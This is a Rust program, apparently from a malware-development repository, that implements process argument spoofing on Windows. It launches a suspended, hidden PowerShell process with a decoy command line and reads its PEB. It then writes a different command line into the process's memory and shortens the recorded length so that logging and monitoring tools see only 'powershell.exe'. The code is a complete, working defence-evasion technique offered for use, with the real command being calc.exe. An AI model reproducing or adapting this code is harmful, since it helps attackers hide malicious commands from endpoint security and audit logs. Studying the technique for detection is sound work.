/*
    Process Argument Spoofing 
    For more Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git
    Resources Used: MALDEV ACADEMY COURSE(C), WINAPI
    @5mukx
    
*/

use std::ptr::null_mut;
use memoffset::offset_of;
use ntapi::{ntpsapi::ProcessBasicInformation, ntrtl::RTL_USER_PROCESS_PARAMETERS};

use winapi::{ctypes::c_void, 
    shared::ntdef::{NT_SUCCESS, UNICODE_STRING}, 
    um::{handleapi::CloseHandle, 
        memoryapi::{ReadProcessMemory, WriteProcessMemory}, 
        processthreadsapi::ResumeThread, 
        synchapi::WaitForSingleObject
    }
};

use ntapi::ntpsapi::PEB_LDR_DATA;
use ntapi::ntpsapi::{NtQueryInformationProcess, PROCESS_BASIC_INFORMATION};
use winapi::um::{errhandlingapi::GetLastError, processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW}};


macro_rules! okey {
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[+] {}", format!($msg, $($arg), *));
    }
}

macro_rules! error{
    ($msg:expr, $($arg:expr), *) => {
        println!("\\_____[-] {}", format!($msg, $($arg), *)); 
        println!("Exiting ..."); 
    }
}

macro_rules! wide_string {
    ($s:literal) => {{
        const INPUT: &[u8] = $s.as_bytes();
        let output_len = utf16_len(INPUT) + 1;
        let mut buffer = vec![0; output_len];
        let mut input_pos = 0;
        let mut output_pos = 0;
        while let Some((mut code_point, new_pos)) = decode_utf8_char(INPUT, input_pos) {
            input_pos = new_pos;
            if code_point <= 0xffff {
                buffer[output_pos] = code_point as u16;
                output_pos += 1;
            } else {
                code_point -= 0x10000;
                buffer[output_pos] = 0xd800 + (code_point >> 10) as u16;
                output_pos += 1;
                buffer[output_pos] = 0xdc00 + (code_point & 0x3ff) as u16;
                output_pos += 1;
            }
        }
        buffer.as_ptr()
    }};
}

pub const fn utf16_len(bytes: &[u8]) -> usize {
    let mut pos = 0;
    let mut len = 0;
    while let Some((code_point, new_pos)) = decode_utf8_char(bytes, pos) {
        pos = new_pos;
        len += if code_point <= 0xffff { 1 } else { 2 };
    }
    len
}

pub const fn decode_utf8_char(bytes: &[u8], mut pos: usize) -> Option<(u32, usize)> {
    if bytes.len() == pos {
        return None;
    }
    let ch = bytes[pos] as u32;
    pos += 1;
    if ch <= 0x7f {
        return Some((ch, pos));
    }
    if (ch & 0xe0) == 0xc0 {
        if bytes.len() - pos < 1 {
            return None;
        }
        let ch2 = bytes[pos] as u32;
        pos += 1;
        if (ch2 & 0xc0) != 0x80 {
            return None;
        }
        let result: u32 = ((ch & 0x1f) << 6) | (ch2 & 0x3f);
        if result <= 0x7f {
            return None;
        }
        return Some((result, pos));
    }
    if (ch & 0xf0) == 0xe0 {
        if bytes.len() - pos < 2 {
            return None;
        }
        let ch2 = bytes[pos] as u32;
        pos += 1;
        let ch3 = bytes[pos] as u32;
        pos += 1;
        if (ch2 & 0xc0) != 0x80 || (ch3 & 0xc0) != 0x80 {
            return None;
        }
        let result = ((ch & 0x0f) << 12) | ((ch2 & 0x3f) << 6) | (ch3 & 0x3f);
        if result <= 0x7ff || (0xd800 <= result && result <= 0xdfff) {
            return None;
        }
        return Some((result, pos));
    }
    if (ch & 0xf8) == 0xf0 {
        if bytes.len() - pos < 3 {
            return None;
        }
        let ch2 = bytes[pos] as u32;
        pos += 1;
        let ch3 = bytes[pos] as u32;
        pos += 1;
        let ch4 = bytes[pos] as u32;
        pos += 1;
        if (ch2 & 0xc0) != 0x80 || (ch3 & 0xc0) != 0x80 || (ch4 & 0xc0) != 0x80 {
            return None;
        }
        let result = ((ch & 0x07) << 18) | ((ch2 & 0x3f) << 12) | ((ch3 & 0x3f) << 6) | (ch4 & 0x3f);
        if result <= 0xffff || 0x10ffff < result {
            return None;
        }
        return Some((result, pos));
    }
    None
}

#[allow(non_camel_case_types)]
pub type PPS_POST_PROCESS_INIT_ROUTINE = Option<unsafe extern "system" fn()>;

#[allow(non_snake_case)]
#[repr(C)]
pub struct PEB {
    pub Reserved1: [u8; 2],
    pub BeingDebugged: u8,
    pub Reserved2: [u8; 1],
    pub Reserved3: [*mut c_void; 2],
    pub Ldr: *mut PEB_LDR_DATA,
    pub ProcessParameters: *mut RTL_USER_PROCESS_PARAMETERS,
    pub Reserved4: [*mut c_void; 3],
    pub AtlThunkSListPtr: *mut c_void,
    pub Reserved5: *mut c_void,
    pub Reserved6: u32,
    pub Reserved7: *mut c_void,
    pub Reserved8: u32,
    pub AtlThunkSListPtr32: u32,
    pub Reserved9: [*mut c_void; 45],
    pub Reserved10: [u8; 96],
    pub PostProcessInitRoutine: PPS_POST_PROCESS_INIT_ROUTINE,
    pub Reserved11: [u8; 128],
    pub Reserved12: [*mut c_void; 1],
    pub SessionId: u32,
}


fn main(){
    unsafe{
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let mut command_line:Vec<u16> =  "powershell.exe argument spoofing\0".encode_utf16().collect();
        // let mut command_line: Vec<u16> = "powershell.exe ping -n 50 google.com\0".encode_utf16().collect();

        let create_process = CreateProcessW(
            null_mut(), 
            command_line.as_mut_ptr() as *mut u16, 
            null_mut(), 
            null_mut(), 
            0, 
            0x00000004 | 0x08000000, 
            null_mut(), 
            wide_string!("C:\\Windows\\System32"), 
            &mut startup_info, 
            &mut process_info,
        );

        if create_process == 0{
            error!("CreateProcessW Failed with errror: {}", GetLastError());
            return;
        }

        okey!("Targert Process ID: {}", process_info.dwProcessId);

        let hprocess = process_info.hProcess;
        let hthread = process_info.hThread;
        

        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let mut return_len: u32 = 0;

        let nt_status = NtQueryInformationProcess(
            hprocess,
            ProcessBasicInformation,
            &mut pbi as *mut PROCESS_BASIC_INFORMATION as *mut c_void, 
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32 ,
            &mut return_len,
        );

        if !NT_SUCCESS(nt_status) {
            error!("NtQueryInformationProcess failed with status: {}", nt_status);
            ClosePT(hprocess, hthread);
            return;
        }

        okey!("Address to PEB: {:?}",pbi.PebBaseAddress);

        let mut ppeb: PEB = std::mem::zeroed();
        let mut p_params: RTL_USER_PROCESS_PARAMETERS = std::mem::zeroed();


        let mut bytes_read: usize = 0;
        
        let success = ReadProcessMemory(
            hprocess,
            pbi.PebBaseAddress as *mut c_void,
            &mut ppeb as *mut _ as *mut c_void,
            std::mem::size_of::<PEB>(),
            &mut bytes_read,
        );

        if success == 0{
            error!("ReadProcessMemory (1) faied: {}", GetLastError());
            ClosePT(hprocess, hthread);
            return;
        }

        // using ppeb
        let success = ReadProcessMemory(
            hprocess,
            ppeb.ProcessParameters as *const c_void,
            &mut p_params as *mut _ as *mut c_void,
            std::mem::size_of::<RTL_USER_PROCESS_PARAMETERS>() + 255,
            null_mut(),
        );

        if success == 0{
            error!("ReadProcessMemory (1) faied: {}", GetLastError());
            ClosePT(hprocess, hthread);
            return;
        }


        let reajust_argument: Vec<u16> = "powershell.exe -NoExit calc.exe\0".encode_utf16().collect();   

        let success = WriteProcessMemory(
            hprocess,
            p_params.CommandLine.Buffer as _,
            reajust_argument.as_ptr() as _,
            reajust_argument.len() * std::mem::size_of::<u16>() +1,
            null_mut(),
        );

        if success == 0 {
            error!("WriteProcessMemory (1) failed with error: {}",GetLastError());
            ClosePT(hprocess, hthread);
            return;
        }

        // let new_len_power: u32 = "powershell.exe\0".len() as u32;
        let new_len_power: usize = "powershell.exe\0".encode_utf16().count() * std::mem::size_of::<u16>();
        let written = ppeb.ProcessParameters as usize + offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) 
                                + offset_of!(UNICODE_STRING, Length);
        // 

        let success = WriteProcessMemory(
            hprocess, 
            written as *mut c_void,
            &new_len_power as *const _ as *const c_void, 
            std::mem::size_of::<u32>(),
            null_mut(),
        ); 

        if success == 0 {
            error!("WriteProcessMemory (2) failed with error: {}",GetLastError());
            ClosePT(hprocess, hthread);
            return;
        }

        okey!("Thread Executed {}",'!');

        ResumeThread(hthread);
        WaitForSingleObject(hthread, 0xFFFFFFFF);

        CloseHandle(hprocess);
        CloseHandle(hthread);
    }
}

#[allow(non_snake_case)]
fn ClosePT(hprocess: *mut c_void, hthread: *mut c_void){
    unsafe{
        // TerminateProcess(hprocess, 0);
        CloseHandle(hprocess);
        CloseHandle(hthread);
    }
    // std::process::exit(0);
    
}
